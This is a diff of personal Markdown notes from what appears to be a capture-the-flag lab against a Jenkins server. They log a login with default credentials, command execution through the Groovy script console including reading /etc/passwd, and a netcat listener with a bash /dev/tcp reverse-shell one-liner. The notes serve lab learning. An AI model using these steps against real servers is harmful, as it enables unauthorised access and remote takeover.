@@ -66,17 +66,55 @@ Google search: "jenkins default credentials"
 - Didn't work. "admin" is a Windows login.
 - **root:password** worked and I got in.
 
-
+In order to get to the Groovy Script CLI page: 
+> Jenkins features a [Groovy script console](https://www.jenkins.io/doc/book/managing/script-console/) which allows one to run arbitrary Groovy scripts within the Jenkins controller runtime or in the runtime on agents.
+- The Script Console on the controller can be accessed from "Manage Jenkins" > "Script Console" (takes you to: `/cli`). Or by visiting the sub-URL `/script` on your Jenkins instance.
+  - The former takes you to a list of "Available Commands," but I could not access the actual CLI.
+  - Using the `/script` in the URL took me right to the CLI. 
 
 ----
+> respawn: 10.129.212.139
 
-String result = "cat /etc/passwd ".execute().text
-println result
+I tried some arbitrary commands in the CLI: 
+- `which bash` : gave me an error
+- `ifconfig`   : gave me an error
+- And so I Googled for help...
 
-https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html
+[How to Execute Commands in Groovy](https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html)
+- You need to use the `execute()` method.
+- The following found [here](https://stackoverflow.com/questions/2701547/how-to-make-system-command-calls-in-java-groovy): 
+  - The simplest way to invoke an external process in Groovy is to use the execute() command on a string. For example, to execute maven from a groovy script run this:
+```
+"cmd /c mvn".execute()
+```
+  - If you want to capture the output of the command and maybe print it out, you can do this:
+```
+print "cmd /c mvn".execute().text
+```
+  - The 'cmd /c' at the start invokes the Windows command shell. Since mvn.bat is a batch script you need this. For Unix you can invoke the system shell.
 
-**DO:** reverse shell
-- wget is available. Could upload a payload???
-- nc is also available: /usr/bin/nc
 
+
+- Some stuff I tried:
+```
+"cat /etc/passwd ".execute().text   # that printed the /etc/passwd file
+"ifconfig".execute().text           # that showed me network info
+"which bash".execute().text         # result: /usr/bin/bash
+"bash --version".execute().text     # result: version 5.0.17(1)-release
+```
+
+Therefore I can execute arbitrary system commands on the box as root. 
+
+## Pwn
+- The famous bash one-liner
+### Set up a listener on my local/attack machine: 
+```
+nc -nvlp 1234     # TCP listener
+nc -nvlup 1234    # UDP listener
+```
+
+### Executed the Bash One-Liner: 
+```
+/bin/bash -c 'bash -i &> /dev/tcp/10.129.212.139/1234 0>&1'
+```
 
